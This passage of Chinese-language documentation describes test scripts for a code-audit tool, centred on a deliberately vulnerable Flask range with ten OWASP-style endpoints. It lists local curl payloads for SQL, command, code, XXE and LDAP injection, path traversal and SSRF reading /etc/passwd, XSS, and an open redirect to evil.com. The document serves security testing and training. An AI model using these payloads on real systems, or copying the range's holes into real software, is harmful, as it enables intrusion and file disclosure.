**解决方案：**
```bash
# 修改端口号
# 编辑 test_vulnerable_app.py 最后一行
app.run(debug=True, port=5001)  # 改为其他端口
```

#### 问题 2：数据库连接失败

**现象：**
```
sqlite3.OperationalError: unable to open database file
```

**解决方案：**
```bash
# 创建数据库文件
sqlite3 users.db "CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT);"
```

#### 问题 3：模块导入失败

**现象：**
```
ModuleNotFoundError: No module named 'flask'
```

**解决方案：**
```bash
pip install flask
```

---

## 5️⃣ test_all_vulnerabilities.py - 全漏洞测试

### 📋 脚本简介

`test_all_vulnerabilities.py` 是一个包含 10 种 OWASP Top 10 漏洞的完整测试靶场，用于验证代码审计工具的全面检测能力。

**脚本路径：** `tests/test_all_vulnerabilities.py`

**主要功能：**
- ✅ 包含 10 种常见漏洞类型
- ✅ 每个漏洞都有独立端点
- ✅ 提供安全代码示例
- ✅ 支持 LDAP 模块可选导入

---

### 🎯 使用场景

1. **全面测试代码审计工具**
2. **验证规则库完整性**
3. **学习各种漏洞原理**
4. **安全培训和教育**

---

### 🚀 快速开始

#### 1. 启动测试服务器

```bash
# 进入项目目录
cd d:/Desktop/1/1

# 启动测试应用
python tests/test_all_vulnerabilities.py
```

服务器会在 `http://127.0.0.1:5000` 启动。

#### 2. 测试漏洞端点

```bash
# SQL 注入
curl "http://127.0.0.1:5000/sql_injection?id=1' OR '1'='1"

# 命令注入
curl "http://127.0.0.1:5000/command_injection?host=8.8.8.8; whoami"

# 代码注入
curl "http://127.0.0.1:5000/code_injection?code=__import__('os').system('whoami')"

# 路径遍历
curl "http://127.0.0.1:5000/path_traversal?file=../../../etc/passwd"

# SSRF
curl "http://127.0.0.1:5000/ssrf?url=file:///etc/passwd"

# XSS
curl "http://127.0.0.1:5000/xss?input=<script>alert(1)</script>"

# XXE
curl -X POST "http://127.0.0.1:5000/xxe" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'

# LDAP 注入
curl "http://127.0.0.1:5000/ldap_injection?filter=*)(uid=*)"

# 开放重定向
curl -I "http://127.0.0.1:5000/open_redirect?url=http://evil.com"
```

---

### 📋 漏洞端点列表

| 序号 | 端点 | 方法 | 漏洞类型 | CWE ID | 严重程度 |
|-----|------|------|---------|--------|---------|
| 1 | `/sql_injection` | GET | SQL 注入 | CWE-89 | Critical |
| 2 | `/command_injection` | GET | 命令注入 | CWE-78 | Critical |
| 3 | `/code_injection` | GET | 代码注入 | CWE-94 | Critical |
| 4 | `/deserialization` | POST | 反序列化 | CWE-502 | Critical |
| 5 | `/path_traversal` | GET | 路径遍历 | CWE-22 | High |
| 6 | `/ssrf` | GET | SSRF | CWE-918 | High |
| 7 | `/xss` | GET | XSS | CWE-79 | High |
| 8 | `/xxe` | POST | XXE | CWE-611 | High |
| 9 | `/ldap_injection` | GET | LDAP 注入 | CWE-90 | High |
| 10 | `/open_redirect` | GET | 开放重定向 | CWE-601 | Medium |

### 🛡️ 安全端点列表

| 序号 | 端点 | 方法 | 安全措施 |
|-----|------|------|---------|
| 1 | `/safe_sql` | GET | 参数化查询 |
| 2 | `/safe_command` | GET | 列表参数 |
| 3 | `/safe_redirect` | GET | 白名单验证 |

---

### 🔍 详细使用说明

关于 `test_all_vulnerabilities.py` 的详细使用说明，请参考：

**详细文档：** `tests/README.md`

该文档包含：
- 每种漏洞的详细说明
- 测试方法和命令
- 漏洞原理和修复方法
- 安全注意事项
- 故障排除指南

---

### ⚠️ 安全注意事项

1. **绝对不要**
   - ❌ 部署到生产环境
   - ❌ 暴露在公网上
   - ❌ 在不安全的环境中运行

2. **仅用于**
   - ✅ 本地开发和测试
   - ✅ 验证代码审计工具
   - ✅ 学习安全漏洞原理
   - ✅ 安全培训和教育

3. **运行环境**
   - 仅在本地运行（127.0.0.1）
   - 使用防火墙限制访问
   - 定期检查运行状态

---

### 🐛 故障排除

#### 问题 1：无法启动服务器

**现象：**
```
ModuleNotFoundError: No module named 'flask'
```

**解决方案：**
```bash
pip install flask
```

#### 问题 2：LDAP 注入测试失败

**现象：**
访问 `/ldap_injection` 返回 "LDAP module not available"

**解决方案：**
```bash
pip install python-ldap
```

#### 问题 3：端口被占用

**现象：**
```
OSError: [WinError 10048] 通常每个套接字地址只能使用一次
```

**解决方案：**
```bash
# 修改端口号
# 编辑 test_all_vulnerabilities.py 最后一行
app.run(debug=True, port=5001)  # 改为其他端口
```

---

## 📊 测试脚本对比

| 脚本名称 | 主要功能 | 测试目标 | 输出文件 | 运行时间 |
|---------|---------|---------|---------|---------|
| `test_audit.py` | 审计工具集成测试 | 完整审计流程 | HTML/JSON/TXT 报告 | ~1 秒 |
| `test_poc.py` | PoC 生成功能测试 | PoC 生成能力 | Python 脚本 | ~2 秒 |
| `test_sink_detection.py` | Sink 点检测测试 | 危险函数识别 | 控制台输出 | ~0.5 秒 |
| `test_vulnerable_app.py` | 漏洞应用示例 | Flask 应用 | 无（需手动测试） | 持续运行 |
| `test_all_vulnerabilities.py` | 全漏洞测试靶场 | 10 种漏洞类型 | 无（需手动测试） | 持续运行 |

---

## 🎯 推荐测试流程

### 1. 快速验证

```bash
# 1. 测试 Sink 点检测
python tests/test_sink_detection.py

# 2. 测试 PoC 生成
python tests/test_poc.py

# 3. 测试审计工具
python tests/test_audit.py
```

### 2. 完整测试

```bash
# 1. 启动漏洞应用
python tests/test_vulnerable_app.py

# 2. 在另一个终端运行审计
python tests/test_audit.py

# 3. 检查生成的报告
ls tests/test_reports/
```

### 3. 全面测试

```bash
# 1. 启动全漏洞测试靶场
python tests/test_all_vulnerabilities.py

# 2. 测试所有漏洞端点
# （参考 tests/README.md 中的测试命令）

# 3. 运行所有测试脚本
python tests/test_sink_detection.py
python tests/test_poc.py
python tests/test_audit.py
```

---

## 📚 参考资源

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE 官方网站](https://cwe.mitre.org/)
- [Flask 官方文档](https://flask.palletsprojects.com/)
- [Python 安全最佳实践](https://python.readthedocs.io/en/stable/library/security_warnings.html)
